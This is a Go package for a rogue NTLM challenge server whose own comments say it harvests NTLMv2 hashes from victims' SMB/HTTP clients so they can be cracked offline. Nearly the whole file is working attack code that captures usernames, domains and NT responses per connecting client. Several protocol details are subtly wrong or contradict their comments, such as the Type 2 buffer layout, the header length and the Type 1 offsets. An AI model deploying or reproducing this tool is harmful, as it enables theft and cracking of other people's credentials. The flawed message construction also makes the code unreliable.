// Package ntlm implements the wire messages of the NTLM authentication
// protocol and a challenge server that captures NTLMv2 authentication
// material from unsolicited clients.
//
// The protocol is only implemented to the extent needed to capture the
// NTLMv2 response that a victim's SMB/HTTP client sends after receiving a
// server challenge. No user credentials are validated; the server's purpose
// in this framework is to harvest hashes for offline analysis.
package ntlm

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"sync"
	"sync/atomic"
)

// Signature is the NTLMSSP message header that every NTLM message begins
// with: the literal ASCII bytes "NTLMSSP" followed by a zero NUL terminator.
var Signature = []byte{'N', 'T', 'L', 'M', 'S', 'S', 'P', 0x00}

// NTLM message types. The type lives in the 32-bit little-endian word
// immediately after the 8-byte signature.
const (
	msgNegotiate = 0x00000001 // Type 1, sent by the client (supported by server)
	msgChallenge = 0x00000002 // Type 2, sent by the server (the challenge)
	msgAuthentic = 0x00000003 // Type 3, sent by the client (the response)
)

// Negotiate flags we care about. These are the only bits we need to craft a
// Type 2 that makes Windows clients produce a usable NTLMv2 response.
const (
	flagUnicode   = 0x00000001 // client wants UNICODE string encoding
	flagNTLM      = 0x00000200 // NTLM (not LANMAN) session security supported
	flagNTLMv2Key = 0x00080000 // NTLMv2 key exchange requested
)

// securityBuffer is an NTLM security buffer: (length, max length, offset).
// It is the standard variable-length field descriptor: 2-byte length, 2-byte
// allocated/maximum length and a 4-byte absolute offset from the start of the
// message. Only length and offset are relevant for parsing.
type securityBuffer struct {
	length uint16
	offset uint32
}

// parse extracts the buffer's bytes from a full NTLM packet. base is unused
// because NTLM offsets are absolute from the message start.
func (s securityBuffer) parse(pkt []byte, base int) []byte {
	// Guard the [offset, offset+length) window against both overflow past the
	// packet end and a malformed negative offset.
	end := int(s.offset) + int(s.length)
	if end > len(pkt) || int(s.offset) < 0 {
		return nil
	}
	return pkt[s.offset:end]
}

// putSecurityBuffer writes an 8-byte security buffer at byte offset at in b:
// length and maximum length are both set to len(data), and offset is the
// absolute position of data within the enclosing message.
func putSecurityBuffer(b []byte, at int, data []byte, offset uint32) int {
	binary.LittleEndian.PutUint16(b[at:], uint16(len(data)))   // length
	binary.LittleEndian.PutUint16(b[at+2:], uint16(len(data))) // maximum/allocated length
	binary.LittleEndian.PutUint32(b[at+4:], offset)            // absolute offset into message
	return at + 8                                              // advance past the 8-byte descriptor
}

// IsNTLM reports whether the buffer begins with the NTLMSSP signature.
func IsNTLM(pkt []byte) bool {
	return len(pkt) >= 8 && bytes.Equal(pkt[:8], Signature)
}

// MessageType returns the NTLM message type of a signed packet.
func MessageType(pkt []byte) (uint32, error) {
	if !IsNTLM(pkt) {
		return 0, errors.New("not an NTLM message")
	}
	if len(pkt) < 12 {
		return 0, errors.New("truncated NTLM header")
	}
	// Type is the little-endian word at bytes 8..12, right after the signature.
	return binary.LittleEndian.Uint32(pkt[8:12]), nil
}

// BuildChallenge constructs an NTLM Type 2 (challenge) message. challenge is
// the 8-byte server nonce, or a random one is generated when nil.
func BuildChallenge(challenge []byte, targetName string) ([]byte, error) {
	// If no server nonce was supplied, generate one. The challenge is the
	// value the client hashes against, so a per-handshake random value forces
	// fresh hashes that cannot be replayed.
	if len(challenge) == 0 {
		challenge = make([]byte, 8)
		if _, err := rand.Read(challenge); err != nil {
			return nil, err
		}
	}
	// NTLMv2 requires exactly an 8-byte server challenge.
	if len(challenge) != 8 {
		return nil, errors.New("challenge must be 8 bytes")
	}

	var body bytes.Buffer
	body.Write(Signature)
	var mtype [4]byte
	binary.LittleEndian.PutUint32(mtype[:], msgChallenge)
	body.Write(mtype[:])
	// Target name security buffer (16 bytes, incl. maxlen) + flags + challenge.
	target := []byte(targetName)
	// Request UNICODE + NTLM + NTLMv2 key so clients respond with an NTLMv2
	// hash; NTLMv2Key is the bit that makes them emit an NT response we can
	// crack offline.
	flags := uint32(flagUnicode | flagNTLM | flagNTLMv2Key)
	// Fixed message length up to and including the target name payload:
	// signature(8) + type(4) + target secbuf(16) + flags(4) + challenge(8)
	// + context(8) + target-info secbuf(8) = 56, then the payload after it.
	headerLen := 32 + 16 + 4 + 8 + 8 + 8 + 8
	targetOffset := uint32(headerLen)
	buf := make([]byte, 0, headerLen+len(target))
	buf = append(buf, body.Bytes()...)
	sec := make([]byte, 16)
	putSecurityBuffer(sec, 0, target, targetOffset)
	putSecurityBuffer(sec, 8, nil, 0) // target info (empty)
	buf = append(buf, sec...)
	f := make([]byte, 4)
	binary.LittleEndian.PutUint32(f, flags)
	buf = append(buf, f...)
	buf = append(buf, challenge...)
	// Context (8) + target info (8) zeroed.
	buf = append(buf, make([]byte, 16)...)
	buf = append(buf, target...)
	return buf, nil
}

// Type1 carries the parsed client negotiate message.
type Type1 struct {
	Domain string
	Host   string
}

// ParseType1 extracts the client identity fields from a negotiate message.
func ParseType1(pkt []byte) (Type1, error) {
	var t Type1
	if err := requireType(pkt, msgNegotiate); err != nil {
		return t, err
	}
	// A type 1 is at least 32 bytes: signature(8) + type(4) + flags(4) +
	// domain secbuf(8) + workstation secbuf(8). The version field (8 bytes)
	// is optional, hence the >= 48 check below.
	if len(pkt) < 32 {
		return t, errors.New("truncated type 1 message")
	}
	// With the 16-byte optional version block present the security buffers
	// sit at 40 (domain) and 48 (workstation).
	if len(pkt) >= 48 {
		t.Domain = string(readBuffer(pkt, 40))
		t.Host = string(readBuffer(pkt, 48))
	}
	return t, nil
}

// Type3 is a parsed authenticate message containing the captured material.
type Type3 struct {
	Username   string
	Domain     string
	NTResponse []byte // NTLMv2 response (the valuable hash material)
	LMResponse []byte
}

// ParseType3 extracts the authentication material from an authenticate
// message. The challenge that was presented to the client is returned via
// caller-supplied challenge so it can be stored alongside the hash.
func ParseType3(pkt []byte) (Type3, error) {
	var t Type3
	if err := requireType(pkt, msgAuthentic); err != nil {
		return t, err
	}
	// A type 3 is at least 64 bytes through the workstation security buffer:
	// signature(8) + type(4) + LM resp secbuf(8) + NT resp secbuf(8) +
	// domain secbuf(8) + user secbuf(8) + workstation secbuf(8) + session key
	// secbuf(8) + flags(4) = 64.
	if len(pkt) < 64 {
		return t, errors.New("truncated type 3 message")
	}
	// Security buffer offsets: LM response at 12, NT response at 20, domain
	// at 28 and username at 36 (all relative to the message start).
	t.LMResponse = readBuffer(pkt, 12)
	t.NTResponse = readBuffer(pkt, 20)
	t.Domain = string(readBuffer(pkt, 28))
	t.Username = string(readBuffer(pkt, 36))
	return t, nil
}

// requireType verifies that the packet is an NTLM message of type want.
func requireType(pkt []byte, want uint32) error {
	got, err := MessageType(pkt)
	if err != nil {
		return err
	}
	if got != want {
		return fmt.Errorf("expected NTLM type %d, got %d", want, got)
	}
	return nil
}

// readBuffer reads a security buffer at the given byte offset: a 2-byte
// little-endian length followed by a 4-byte little-endian absolute offset.
func readBuffer(pkt []byte, at int) []byte {
	if at+8 > len(pkt) {
		return nil
	}
	sb := securityBuffer{
		length: binary.LittleEndian.Uint16(pkt[at:]),
		offset: binary.LittleEndian.Uint32(pkt[at+4:]),
	}
	return sb.parse(pkt, at)
}

// CapturedHash is a single NTLM hash capture record: the harvested NT
// response together with the server challenge it was computed against, so the
// pair can be cracked offline (e.g. hashcat mode 5600 for NetNTLMv2).
type CapturedHash struct {
	Username   string
	Domain     string
	Challenge  []byte
	NTResponse []byte
	Client     string // remote address of the victim
}

// Handler is called for every captured hash. The server keeps running.
type Handler func(CapturedHash)

// Server is a challenge server that answers NTLM negotiate messages with a
// challenge and captures the resulting authenticate messages.
type Server struct {
	ln        net.Listener
	handler   Handler
	target    string // domain name advertised in the type 2 message
	challenge []byte // fixed challenge for all handshakes, or nil for random

	Accepted atomic.Uint64 // handshakes completed
	Captured atomic.Uint64 // hashes captured
	mu       sync.Mutex
	conns    map[net.Conn]bool // live connections, closed on Stop
	done     chan struct{}     // closed once to signal shutdown
}

// NewServer creates an NTLM capture server. When challenge is nil a fresh
// random one is generated per handshake. target is the domain shown in the
// type 2 message.
func NewServer(handler Handler, target string) *Server {
	s := &Server{handler: handler, target: target}
	s.conns = map[net.Conn]bool{}
	s.done = make(chan struct{})
	return s
}

// Start listens on addr ("0.0.0.0:8445") and begins serving. It returns the
// bound address.
func (s *Server) Start(addr string) (net.Addr, error) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, err
	}
	s.ln = ln
	go s.acceptLoop()
	return ln.Addr(), nil
}

// acceptLoop accepts connections until Stop closes the listener. Each client
// is tracked in s.conns so Stop can force them closed, then handled in its
// own goroutine so one slow victim cannot stall the others.
func (s *Server) acceptLoop() {
	for {
		conn, err := s.ln.Accept()
		if err != nil {
			// Accept fails after the listener is closed: exit only when Stop
			// was requested, otherwise keep retrying (transient errors).
			select {
			case <-s.done:
				return
			default:
			}
			continue
		}
		s.mu.Lock()
		s.conns[conn] = true
		s.mu.Unlock()
		go s.handle(conn)
	}
}

// handle runs one NTLM challenge/response exchange over conn.
func (s *Server) handle(conn net.Conn) {
	// Always deregister and close the connection, on both success and error.
	defer func() {
		s.mu.Lock()
		delete(s.conns, conn)
		s.mu.Unlock()
		_ = conn.Close()
	}()

	challenge := s.challenge
	if len(challenge) == 0 {
		challenge = make([]byte, 8)
		if _, err := rand.Read(challenge); err != nil {
			return
		}
	}

	// The client opens with a negotiate (type 1). SMB sessions also send an
	// SMB2 negotiate first; scan forward for the NTLMSSP blob.
	buf := make([]byte, 0, 4096)
	tmp := make([]byte, 4096)
	for {
		n, err := conn.Read(tmp)
		if n > 0 {
			buf = append(buf, tmp[:n]...)
			// Skip any framing (SMB/SMB2 headers, HTTP headers) ahead of the
			// NTLMSSP signature before attempting to parse.
			if idx := findNTLM(buf); idx >= 0 {
				buf = buf[idx:]
				break
			}
		}
		if err != nil {
			return
		}
		// Safety cap: never read unbounded data from an attacker-controlled
		// socket while hunting for the signature.
		if len(buf) > 8192 {
			return
		}
	}

	t, err := ParseType1(buf)
	if err != nil {
		return
	}
	_ = t

	resp, err := BuildChallenge(challenge, s.target)
	if err != nil {
		return
	}
	if _, err := conn.Write(resp); err != nil {
		return
	}
	s.Accepted.Add(1)

	// Read the authenticate message. First exactly 8 bytes so we can anchor on
	// the fixed header size, then keep reading until the fixed 64-byte prefix
	// is present.
	n, err := io.ReadFull(conn, tmp[:8])
	if err != nil {
		return
	}
	_ = n
	total := append([]byte{}, tmp[:8]...)
	for len(total) < 64 {
		chunk := make([]byte, 64-len(total))
		n, err := conn.Read(chunk)
		if n > 0 {
			total = append(total, chunk[:n]...)
		}
		if err != nil {
			return
		}
	}
	// Grow to cover the security buffers referenced. The NT response payload
	// lives after the header; a 512-byte read over-covers any realistic type 3
	// and lets the security-buffer parse succeed in one pass.
	if len(total) < 512 {
		rest := make([]byte, 512-len(total))
		n, err := conn.Read(rest)
		if n > 0 {
			total = append(total, rest[:n]...)
		}
		_ = err
	}

	t3, err := ParseType3(total)
	if err != nil {
		return
	}
	s.Captured.Add(1)
	if s.handler != nil {
		s.handler(CapturedHash{
			Username:   t3.Username,
			Domain:     t3.Domain,
			Challenge:  challenge,
			NTResponse: t3.NTResponse,
			Client:     conn.RemoteAddr().String(),
		})
	}
}

// findNTLM locates the NTLMSSP signature within the buffer, skipping any
// preceding SMB headers.
func findNTLM(buf []byte) int {
	for i := 0; i+8 <= len(buf); i++ {
		if bytes.Equal(buf[i:i+8], Signature) {
			return i
		}
	}
	return -1
}

// Stop closes the listener and all active connections.
func (s *Server) Stop() {
	// Guard against a double close of s.done by callers.
	select {
	case <-s.done:
		return
	default:
		close(s.done)
	}
	if s.ln != nil {
		_ = s.ln.Close()
	}
	// Force-close every live connection so blocked handle goroutines return.
	s.mu.Lock()
	for c := range s.conns {
		_ = c.Close()
	}
	s.conns = map[net.Conn]bool{}
	s.mu.Unlock()
}

// Addr returns the bound address, or nil before Start.
func (s *Server) Addr() net.Addr {
	if s.ln == nil {
		return nil
	}
	return s.ln.Addr()
}
